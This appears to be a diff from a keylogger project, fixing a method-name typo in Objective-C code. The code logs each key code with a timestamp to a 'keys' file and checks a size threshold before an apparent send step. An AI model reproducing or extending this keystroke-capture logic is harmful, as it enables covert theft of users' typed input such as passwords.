@@ -36,7 +36,7 @@
 
 - (void)doFullCycle: (int)key {
     [FileManager writeToFile:@"keys" file:[NSString stringWithFormat:@"%-3d = %-13s (%@)\n", key,
-                                           [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String],
+                                           [[KeycodeEncrypter keyStringFromKeyCode:key] UTF8String],
                                            [Time currentTime]]];
 
     if ([FileManager getFileSize:@"keys"] >= fileSize && shouldSend) {
